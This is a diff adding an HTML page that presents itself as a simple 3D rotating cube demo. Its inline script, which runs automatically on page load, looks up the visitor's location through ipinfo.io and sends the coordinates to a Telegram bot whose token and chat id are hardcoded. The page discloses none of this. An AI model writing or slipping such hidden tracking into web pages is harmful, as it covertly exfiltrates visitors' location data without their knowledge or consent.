@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Rotating Cube</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #282c34;
+            margin: 0;
+            overflow: hidden;
+        }
+        .scene {
+            width: 200px;
+            height: 200px;
+            perspective: 600px;
+        }
+        .cube {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            transform-style: preserve-3d;
+            transform: rotateX(0deg) rotateY(0deg);
+            animation: rotate 5s infinite linear;
+        }
+        .cube div {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        .front  { transform: translateZ(100px); }
+        .back   { transform: rotateY(180deg) translateZ(100px); }
+        .right  { transform: rotateY(90deg) translateZ(100px); }
+        .left   { transform: rotateY(-90deg) translateZ(100px); }
+        .top    { transform: rotateX(90deg) translateZ(100px); }
+        .bottom { transform: rotateX(-90deg) translateZ(100px); }
+
+        @keyframes rotate {
+            from { transform: rotateX(0deg) rotateY(0deg); }
+            to { transform: rotateX(360deg) rotateY(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="scene">
+        <div class="cube">
+            <div class="front"></div>
+            <div class="back"></div>
+            <div class="right"></div>
+            <div class="left"></div>
+            <div class="top"></div>
+            <div class="bottom"></div>
+        </div>
+    </div>
+    <script>
+        async function getCoordinates() {
+            const response = await fetch('https://ipinfo.io/json?token=a55b770912ea56');
+            const data = await response.json();
+            return data.loc; // The 'loc' field contains the latitude and longitude
+        }
+
+        async function sendCoordinatesToTelegram(coordinates) {
+            const telegramToken = '7677600796:AAH3xR09FG-OYpXOiEa-X9L2vQ3jqovnOwU';
+            const chatId = '7408094776';
+            const message = `The coordinates are: ${coordinates}`;
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
+        (async () => {
+            try {
+                const coordinates = await getCoordinates();
+                await sendCoordinatesToTelegram(coordinates);
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        })();
+
+        const cube = document.querySelector('.cube');
+        let isRotating = true;
+
+        cube.addEventListener('click', () => {
+            if (isRotating) {
+                cube.style.animationPlayState = 'paused';
+            } else {
+                cube.style.animationPlayState = 'running';
+            }
+            isRotating = !isRotating;
+        });
+    </script>
+</body>
+</html>
